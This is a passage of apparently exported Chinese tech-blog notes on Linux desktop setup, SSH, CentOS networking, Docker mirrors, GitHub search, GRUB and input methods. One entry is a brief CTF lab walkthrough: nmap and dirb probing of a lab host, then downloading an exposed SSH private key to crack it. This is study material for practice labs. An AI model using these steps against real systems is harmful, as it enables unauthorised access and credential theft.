<li><p><code>lightdm-webkit-greeter</code> 从github上获取主题</p>
</li>
<li><p><code>lightdm-webkit2-greeter</code> 从github上获取主题</p>
</li>
<li><p><code>slick-greeter</code> <a href="https://www.gnome-look.org/">从gnome-look获取GTK主题</a> 安装<code>lightdm-settings</code>图形管理</p>
</li>
</ul>
<p><a href="https://blog.csdn.net/chouzhou9701/article/details/90176122">参考</a></p>
<p><strong>GTK 窗体 &amp; 图标 &amp; 鼠标主题配置</strong><br><a href="https://www.gnome-look.org/">从gnome-look获取GTK主题</a><br>主题目录: <code>/usr/share/themes/</code><br>图标 &amp; 鼠标主题目录:<code>/usr/share/icons/</code><br>安装<code>lxappearance</code> (gtk2) 或<code>lxappearance-gtk3</code> (gtk3) 通过图形界面配置</p>
<h3 id="必备"><a href="#必备" class="headerlink" title="必备"></a>必备</h3><ul>
<li><code>i3blocks</code> 状态栏</li>
<li><code>rofi</code> 软件启动器</li>
<li><code>alacritty</code> 终端</li>
<li><code>wqy-microhei</code> 中文字体</li>
</ul>
<p>字体<br>ttf-symbola (提供许多 Unicode 符号，包括 Emoji)<br>wqy-zenhei  (文泉驿正黑体)<br>wqy-bitmapfont (文泉驿点阵宋体)<br>adobe-source-han-sans-otc-fonts (思源黑体，无衬线字体)<br>adobe-source-han-serif-otc-fonts (思源宋体，衬线字体)</p>
<h3 id="状态栏配置"><a href="#状态栏配置" class="headerlink" title="状态栏配置"></a>状态栏配置</h3><p>安装字体： <a href="https://github.com/FortAwesome/Font-Awesome"><code>fon-awesome</code></a>, <a href="https://gitlab.gnome.org/GNOME/pango">Pango</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S otf-font-awesome pango</span><br></pre></td></tr></table></figure></p>
<p>                                             <br>                                    </p>
<p>修改i3blocks配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[script] 		# 脚本</span><br><span class="line">#align&#x3D; 		# 对齐</span><br><span class="line">#color&#x3D; 		# 颜色</span><br><span class="line">command&#x3D; 		# 命令</span><br><span class="line">#format&#x3D; 		# 格式</span><br><span class="line">#full_text&#x3D; 	# 完整文字</span><br><span class="line">#instance&#x3D; 		# 实例</span><br><span class="line">interval&#x3D; 		# 间隔</span><br><span class="line">#label&#x3D; 		# 标签</span><br><span class="line">#markup&#x3D; 		# 标记</span><br><span class="line">#min_width&#x3D; 	# 最小宽度</span><br><span class="line">#name&#x3D; 			# 名称</span><br><span class="line">#separator&#x3D; 	# 分隔符</span><br><span class="line">#separator_block_width&#x3D; 	# 分隔块的宽度</span><br><span class="line">#short_text&#x3D; 	# 短文字</span><br><span class="line">#signal&#x3D; 		# 信号</span><br><span class="line">#urgent&#x3D; 		# 紧急</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backlight   亮度</span><br><span class="line">bandwidth2  带宽</span><br><span class="line">battery2  电量</span><br><span class="line">cpu_usage2</span><br><span class="line">disk-io</span><br><span class="line">gpu-load</span><br><span class="line">mediaplayer</span><br><span class="line">memory</span><br><span class="line">monitor_manager</span><br><span class="line">volume-pulseaudio</span><br><span class="line">usb</span><br><span class="line">ssid</span><br><span class="line">wifi</span><br></pre></td></tr></table></figure>
<p>yay -S ttf-symbola 提供许多 Unicode 符号，包括 Emoji</p>
<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S openssh</span><br></pre></td></tr></table></figure>
<p>ssh服务端配置文件 : <code>/etc/ssh/sshd_config</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只允许某些用户访问</span></span><br><span class="line">AllowUsers    用户1 用户2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只允许某些用户组访问</span></span><br><span class="line">AllowGroups   用户组1 用户组2</span><br><span class="line"></span><br><span class="line"><span class="comment">#禁用root登录</span></span><br><span class="line">PermitRootLongin no</span><br></pre></td></tr></table></figure>
<p>开机启动 : <code>sudo systemctl enable sshd</code><br>重启服务 : <code>sudo systemctl restart sshd</code></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF学习笔记</title>
    <url>/2019/07/27/CTF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="CTF-学习笔记"><a href="#CTF-学习笔记" class="headerlink" title="CTF 学习笔记"></a>CTF 学习笔记</h1><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.0.0/24		<span class="comment">#扫描网段存活IP</span></span><br><span class="line">nmap -sV 192.168.0.0/24		<span class="comment">#扫描存活端口</span></span><br><span class="line"><span class="comment">#通过开放的可疑端口（将服务运行在非常规的端口上）访问，查看源代码看是否有有用信息</span></span><br><span class="line"></span><br><span class="line">dirb http://192.168.0.7:31337	<span class="comment">#探测隐藏文件</span></span><br><span class="line"><span class="comment">#探测出相关影藏文件后对可疑文件进行分析</span></span><br><span class="line"><span class="comment">#robots文件	记录禁止被探测的文件，通过该文件内容能找到一些重要文件</span></span><br><span class="line"><span class="comment">#.ssh文件		记录ssh秘钥信息，通常id_rsd代表私钥（可用来认证ssh登录），authorized_keys代表认证信息(能从中找用户名等信息))，id_rsa.pub代表公钥</span></span><br><span class="line"><span class="comment">#ssh是一钟远程加密登录协议，通常是用于远程管理计算机使用，ssh可通过口令登录，也可通过秘钥登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过.ssh文件猜猜存在秘钥文件</span></span><br><span class="line"><span class="comment">#获得秘钥文件</span></span><br><span class="line"><span class="comment">#http://192.168.0.7:31337/.ssh/id_rsa</span></span><br><span class="line"><span class="comment">#http://192.168.0.7:31337/.ssh/authorized_keys</span></span><br><span class="line"><span class="comment">#给私钥修改权限</span></span><br><span class="line">chmod 600 id_rsa</span><br><span class="line"><span class="comment">#破解私钥信息</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>安全</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>信息安全</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS无网卡配置文件解决方法</title>
    <url>/2020/02/06/CentOS%E6%97%A0%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="网卡UUID"><a href="#网卡UUID" class="headerlink" title="网卡UUID"></a>网卡UUID</h1><p>查看相应网卡的UUID并记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli con show</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h1><p>查询MAC地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><h2 id="复制配置文件"><a href="#复制配置文件" class="headerlink" title="复制配置文件"></a>复制配置文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /etc/sysconfig/network-scripts/ifcfg-lo /etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></table></figure>
<h2 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改内容为,配置为dhcp方式</span></span><br><span class="line">DEVICE=eth0</span><br><span class="line">BOOTPROTO=dhcp</span><br><span class="line">ONBOOT=yes</span><br><span class="line">NAME=eth0</span><br><span class="line">HWADDR=08:00:27:87:e0:71</span><br><span class="line">UUID=5ba235cf-49ea-4648-9e65-609208bf7b64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若配置静态地址</span></span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=192.168.56.3</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.56.1</span><br><span class="line">DNS1=114.114.114.114</span><br></pre></td></tr></table></figure>
<h1 id="重启网络"><a href="#重启网络" class="headerlink" title="重启网络"></a>重启网络</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>DockerHub加速</title>
    <url>/2020/02/27/DockerHub%E5%8A%A0%E9%80%9F/</url>
    <content><![CDATA[<h1 id="DockerHub国内加速地址"><a href="#DockerHub国内加速地址" class="headerlink" title="DockerHub国内加速地址"></a>DockerHub国内加速地址</h1><div class="table-container">
<table>
<thead>
<tr>
<th>加速地址</th>
<th>是否专属</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://registry.docker-cn.com">Docker中国官方</a>: <code>https://registry.docker-cn.com</code></td>
<td>否</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://daocloud.io/mirror">DaoCloud</a>: <code>http://f1361db2.m.daocloud.io</code></td>
<td>是,可登录，系统分配</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://dockerhub.azk8s.cn">Azure</a>: <code>https://dockerhub.azk8s.cn</code></td>
<td>否</td>
<td>Docker Hub、GCR、Quay</td>
</tr>
<tr>
<td><a href="https://docker.mirrors.ustc.edu.cn">中国科技大学</a> : <code>https://docker.mirrors.ustc.edu.cn</code></td>
<td>否</td>
<td>Docker Hub、GCR、Quay</td>
</tr>
<tr>
<td><a href="https://cr.console.aliyun.com/">阿里</a>: <code>https://&lt;your_code&gt;.mirror.aliyuncs.com</code></td>
<td>是，登录获取专属地址</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://reg-mirror.qiniu.com">七牛</a>: <code>https://reg-mirror.qiniu.com</code></td>
<td>否</td>
<td>Docker Hub、GCR、Quay</td>
</tr>
<tr>
<td><a href="https://hub-mirror.c.163.com">网易</a>: <code>https://hub-mirror.c.163.com</code></td>
<td>否</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://mirror.ccs.tencentyun.com">腾讯</a>: <code>https://mirror.ccs.tencentyun.com</code></td>
<td>否</td>
<td>Docker Hub</td>
</tr>
</tbody>
</table>
</div>
<a id="more"></a>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>创建或修改 <code>/etc/docker/daemon.json</code> :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;地址，多条用逗号(,)隔开&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<p>重新加载守护进程配置和重启Docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://juejin.im/post/5cd2cf01f265da0374189441">Docker Hub 镜像加速器</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker容器中使用systemctl报错</title>
    <url>/2020/02/28/Docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8systemctl%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<h1 id="当在Dokcer容器中使用systemctl时报以下错误"><a href="#当在Dokcer容器中使用systemctl时报以下错误" class="headerlink" title="当在Dokcer容器中使用systemctl时报以下错误"></a>当在Dokcer容器中使用<code>systemctl</code>时报以下错误</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">System has not been booted with systemd as init system (PID 1). Can&#39;t operate.</span><br><span class="line">Failed to connect to bus: Host is down&#39;</span><br></pre></td></tr></table></figure>
<h1 id="问题原因："><a href="#问题原因：" class="headerlink" title="问题原因："></a>问题原因：</h1><p>启动容器时执行的启动是<code>/bin/bash</code>,没有相应的权限调用内核程序，需要在<code>run</code>修改相应的指令获得权限</p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>在<code>run</code>指令后加—privileged=true，修改<code>/bin/bash</code> 为<code>/sbin/init</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --privileged=<span class="literal">true</span> -itd xxxxx /sbin/init</span><br></pre></td></tr></table></figure>
<p>进入容器时使用的是<code>docker exec -it xxxxx /bin/bash</code></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Firefox切换本地与全球服务</title>
    <url>/2019/12/20/Firefox%E5%88%87%E6%8D%A2%E6%9C%AC%E5%9C%B0%E4%B8%8E%E5%85%A8%E7%90%83%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<p>为了解决国内用户连接 全球同步服务器 困难的问题，现在的火狐中国版推出了 全球服务 和 本地服务 两套服务。</p>
<pre><code>这两套服务的账号和数据并不通用，并且只有中国版提供了切换功能，因此当你在同步过程中遇到“未知账号”的提示，或者两台设备间数据无法同步的情况时，请尝试下述操作：

1. 安装最新的中国版火狐，因为只有中国版火狐内置了切换选项（详细）

2. 确保 [“附加组件管理器”](http://mozilla.com.cn/thread-343905-1-1.html) 扩展 处于启用状态

3. 查看和切换 当前使用的服务
</code></pre><p>参考：<a href="http://mozilla.com.cn/thread-330960-1-1.html">http://mozilla.com.cn/thread-330960-1-1.html</a></p>
]]></content>
      <tags>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title>Github高效搜索仓库语法</title>
    <url>/2019/11/18/Github%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E4%BB%93%E5%BA%93%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p><strong>对用空格的查询可使用引号</strong>如:<code>“hello worled”</code></p>
<h2 id="按仓库名、自述文件内容搜索"><a href="#按仓库名、自述文件内容搜索" class="headerlink" title="按仓库名、自述文件内容搜索"></a>按仓库名、自述文件内容搜索</h2><a id="more"></a>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>test in:name</code></td>
<td style="text-align:center">搜索名称包含<code>test</code>的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>test in:description</code></td>
<td style="text-align:center">搜索名称或自述文件包含<code>test</code>的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>test in:readme</code></td>
<td style="text-align:center">搜索自述文件包含<code>test</code>的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>repo:test</code></td>
<td style="text-align:center">搜索以<code>test</code>为名的仓库</td>
</tr>
</tbody>
</table>
</div>
<h2 id="指定范围搜索"><a href="#指定范围搜索" class="headerlink" title="指定范围搜索"></a>指定范围搜索</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>user:user_name</code></td>
<td style="text-align:center">指定搜索<code>user_name</code>用户的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>org:org_name</code></td>
<td style="text-align:center">指定搜索<code>org_name</code>组织的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>size:n</code></td>
<td style="text-align:center">指定搜索<code>n</code>大小的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>stars:n</code></td>
<td style="text-align:center">指定搜索<code>n</code>星数的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>forks:n</code></td>
<td style="text-align:center">指定搜索<code>n</code>分支数的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>test fork:true</code></td>
<td style="text-align:center">搜索名称含<code>test</code>的仓库，包括分支仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>test fork:only</code></td>
<td style="text-align:center">只搜索名称包含<code>test</code>分支仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>followers:n</code></td>
<td style="text-align:center">指定搜索<code>n</code>关注数的仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>created:t</code></td>
<td style="text-align:center">指定创建时间<code>t</code>搜索仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>pushed:t</code></td>
<td style="text-align:center">指定更新时间<code>t</code>搜索仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>language:LANGUAGE</code></td>
<td style="text-align:center">指定计算机语言搜索</td>
</tr>
</tbody>
</table>
</div>
<h2 id="范围规定"><a href="#范围规定" class="headerlink" title="范围规定"></a>范围规定</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">范围</th>
<th style="text-align:center">示例</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>&gt;x</code></td>
<td style="text-align:center"><code>&gt;10</code>,<code>&gt;1998-04-06</code></td>
<td style="text-align:center">大于1000;1998年4月6日及之后</td>
</tr>
<tr>
<td style="text-align:center"><code>&gt;=x</code></td>
<td style="text-align:center"><code>&gt;=10</code>,<code>&gt;=1998-04-06</code></td>
<td style="text-align:center">大于等于1000;1998年4月6日之后</td>
</tr>
<tr>
<td style="text-align:center"><code>&lt;x</code></td>
<td style="text-align:center"><code>&lt;10</code>,<code>&lt;1998-04-06</code></td>
<td style="text-align:center">小于1000;1998年4月6日及之前</td>
</tr>
<tr>
<td style="text-align:center"><code>&lt;=x</code></td>
<td style="text-align:center"><code>&lt;=10</code>,<code>&lt;=1998-04-06</code></td>
<td style="text-align:center">小于等于1000;1998年4月6日之前</td>
</tr>
<tr>
<td style="text-align:center"><code>x..*</code></td>
<td style="text-align:center"><code>10..*</code>,<code>1998-04-06..*</code></td>
<td style="text-align:center">等同于<code>&gt;=x</code></td>
</tr>
<tr>
<td style="text-align:center"><code>**..x</code></td>
<td style="text-align:center"><code>*..10</code>,<code>*..1998-04-06</code></td>
<td style="text-align:center">等同于<code>&lt;=x</code></td>
</tr>
<tr>
<td style="text-align:center"><code>x..x</code></td>
<td style="text-align:center"><code>10..100</code>,<code>1998-04-06..1999-04-07</code></td>
<td style="text-align:center">10到100间;1998.4.6~1999.4.7间</td>
</tr>
</tbody>
</table>
</div>
<h2 id="排除"><a href="#排除" class="headerlink" title="排除"></a>排除</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">说明示例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>NOT</code></td>
<td style="text-align:center"><code>hello NOT world</code>匹配含<code>hello</code>d但不含<code>world</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-QUALIFIER</code></td>
<td style="text-align:center"><code>-指令</code>(减指令),如<code>-language:javascript</code>(减去JavaScript编写的)</td>
</tr>
</tbody>
</table>
</div>
<p>参考：<a href="https://help.github.com/cn/github/searching-for-information-on-github">https://help.github.com/cn/github/searching-for-information-on-github</a></p>
]]></content>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>GRUB主题美化</title>
    <url>/2019/09/24/GRUB%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h2 id="下载主题包"><a href="#下载主题包" class="headerlink" title="下载主题包"></a>下载主题包</h2><p>到<a href="https://www.gnome-look.org/browse/cat/109/ord/rating/">gnome-look</a>下载喜欢的主题</p>
<p>我用的是：<a href="https://www.gnome-look.org/p/1009236/">Grub-theme-vimix</a></p>
<p><strong>解压主题包</strong></p>
<h2 id="使用主题包"><a href="#使用主题包" class="headerlink" title="使用主题包"></a>使用主题包</h2><h3 id="脚本方式安装"><a href="#脚本方式安装" class="headerlink" title="脚本方式安装"></a>脚本方式安装</h3><p>一些主题包内包含了一件安装脚本，只需运行就可安装使用该主题</p>
<h3 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h3><p>没有安装脚本的主题，或自定义的主题，需要自行手动安装</p>
<a id="more"></a>
<p><strong>将主题文件夹放到到GRUB主题目录下</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo cp  主题文件夹 /boot/grub/themes/</span><br></pre></td></tr></table></figure><br><strong>修改配置使用该主题</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/grub.d/00_header</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入配置内容</span></span><br><span class="line">GRUB_THEME=<span class="string">&quot;/boot/grub/themes/主题文件夹/theme.txt&quot;</span></span><br><span class="line"><span class="comment"># 设置分辨率 auto（自动） 1920x1080x32</span></span><br><span class="line"><span class="comment">#GRUB_GFXMODE=auto</span></span><br><span class="line">GRUB_GFXMODE=<span class="string">&quot;1920x1080x32&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="更新配置"><a href="#更新配置" class="headerlink" title="更新配置"></a>更新配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>GRUB</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo添加子目录站点</title>
    <url>/2019/11/20/Hexo%E6%B7%BB%E5%8A%A0%E5%AD%90%E7%9B%AE%E5%BD%95%E7%AB%99%E7%82%B9/</url>
    <content><![CDATA[<p><strong>在Hexo博客项目根目录下</strong></p>
<h1 id="新建子目录"><a href="#新建子目录" class="headerlink" title="新建子目录"></a>新建子目录</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir <span class="built_in">source</span>/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h1 id="创建index-html"><a href="#创建index-html" class="headerlink" title="创建index.html"></a>创建index.html</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim index.html</span><br><span class="line"># 加入内容</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;Test&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;Test&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h1><p>  <strong>修改配置使Hexo不渲染该目录下的html内容</strong><br>  <strong>修改完后执行一下hexo clean</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml</span><br><span class="line"><span class="comment"># 修改skip_render</span></span><br><span class="line">skip_render: <span class="built_in">test</span>/*.html</span><br></pre></td></tr></table></figure></p>
<h2 id="单个文件夹下全部文件"><a href="#单个文件夹下全部文件" class="headerlink" title="单个文件夹下全部文件"></a>单个文件夹下全部文件</h2><p><code>skip_render: test/*</code></p>
<h2 id="单个文件夹下指定类型文件"><a href="#单个文件夹下指定类型文件" class="headerlink" title="单个文件夹下指定类型文件"></a>单个文件夹下指定类型文件</h2><p><code>skip_render: test/*.md</code></p>
<h2 id="单个文件夹下全部文件以及子目录"><a href="#单个文件夹下全部文件以及子目录" class="headerlink" title="单个文件夹下全部文件以及子目录"></a>单个文件夹下全部文件以及子目录</h2><p><code>skip_render: test/**</code></p>
<h2 id="多个文件夹以及各种复杂情况"><a href="#多个文件夹以及各种复杂情况" class="headerlink" title="多个文件夹以及各种复杂情况"></a>多个文件夹以及各种复杂情况</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">skip_render: README.md</span><br><span class="line">  - &#96;test1&#x2F;*.html&#96;</span><br><span class="line">  - &#96;test2&#x2F;**&#96;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>IBus-Rime输入法安装配置</title>
    <url>/2019/10/19/IBus-Rime%E8%BE%93%E5%85%A5%E6%B3%95%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>  Ibus是Linux上打输入法引擎，搜狗使用的是Fcitx引擎，但受够了搜狗的中文乱码问题(花了三天在网找各种方案尝试都没解决)，且Gnome桌面已经集成了IBus,现在决定跳槽IBus,虽然没有了像搜狗输入法那样的好看皮肤，但比没法输入好。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><strong>安装ibus</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ibus</span><br></pre></td></tr></table></figure></p>
<h2 id="安装中文输入法rime"><a href="#安装中文输入法rime" class="headerlink" title="安装中文输入法rime"></a>安装中文输入法rime</h2><a id="more"></a>
<p>直接开始安装rime也可以，包管理器会自动安装ibus<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ibus-rime</span><br></pre></td></tr></table></figure></p>
<h2 id="安装输入方案"><a href="#安装输入方案" class="headerlink" title="安装输入方案"></a>安装输入方案</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 朙月拼音（预装）</span></span><br><span class="line">sudo pacman librime-data-luna-pinyin</span><br><span class="line"><span class="comment"># 双拼</span></span><br><span class="line">sudo pacman -S librime-data-double-pinyin</span><br><span class="line"><span class="comment"># 宫保拼音</span></span><br><span class="line">sudo pacman -S librime-data-combo-pinyin</span><br><span class="line"><span class="comment"># 注音、地球拼音</span></span><br><span class="line">sudo pacman -S librime-data-terra-pinyin librime-data-bopomofo</span><br><span class="line"><span class="comment"># 仓颉五代（预装）</span></span><br><span class="line">sudo pacman -S librime-data-cangjie5</span><br><span class="line"><span class="comment"># 速成五代</span></span><br><span class="line">sudo pacman -S librime-data-quick5</span><br><span class="line"><span class="comment"># 五笔86、袖珍简化字拼音、五笔画</span></span><br><span class="line">sudo pacman -S librime-data-wubi librime-data-pinyin-simp librime-data-stroke-simp</span><br><span class="line"><span class="comment"># 上海吴语</span></span><br><span class="line">sudo pacman -S librime-data-wugniu</span><br><span class="line"><span class="comment"># 粤拼</span></span><br><span class="line">sudo pacman -S librime-data-jyutping</span><br><span class="line"><span class="comment"># 中古汉语拼音</span></span><br><span class="line">sudo pacman -S librime-data-zyenpheng</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="安装qt程序支持包"><a href="#安装qt程序支持包" class="headerlink" title="安装qt程序支持包"></a>安装qt程序支持包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S ibus-qt</span><br></pre></td></tr></table></figure>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="非gnome桌面配置"><a href="#非gnome桌面配置" class="headerlink" title="非gnome桌面配置"></a>非gnome桌面配置</h2><p><strong>gnome桌面直接跳过</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.xprofile 		<span class="comment"># 没有就新建该文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入内容</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=ibus</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=@im=ibus</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=ibus</span><br><span class="line">ibus-daemon -x -d</span><br></pre></td></tr></table></figure><br><strong>重启系统即可</strong></p>
<h2 id="配置rime"><a href="#配置rime" class="headerlink" title="配置rime"></a>配置rime</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/ibus/rime/default.custom.yaml  <span class="comment">#新建rime定制文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入内容,保存后重新部署rime</span></span><br><span class="line">patch:</span><br><span class="line">  schema_list:</span><br><span class="line">    - schema: luna_pinyin</span><br></pre></td></tr></table></figure>
<p>排序很重要，该文件会向 Rime 表明，将输入方案改成这份只包含 <code>luna_pinyin</code> (朙月拼音) 等的选项</p>
<p><strong>可以使用的方案清单：</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- luna_pinyin (朙月拼音)</span><br><span class="line">- terra-pinyin (地球拼音)</span><br><span class="line">- terra_pinyin (拼音跟声调)</span><br><span class="line">- combo_pinyin (宫保拼音)</span><br><span class="line">- bopomofo (注音)</span><br><span class="line">- double_pinyin (双拼)</span><br><span class="line">- cangjie5 (仓颉五代)</span><br><span class="line">- wubi86 (五笔86)</span><br><span class="line">- pinyin-simp (袖珍简化字拼音)</span><br><span class="line">- stroke_simp (五笔画)</span><br><span class="line">- jyutping (粤拼)</span><br><span class="line">- wugniu (上海吴语)</span><br><span class="line">- zyenpheng (中古汉语拼音)</span><br></pre></td></tr></table></figure></p>
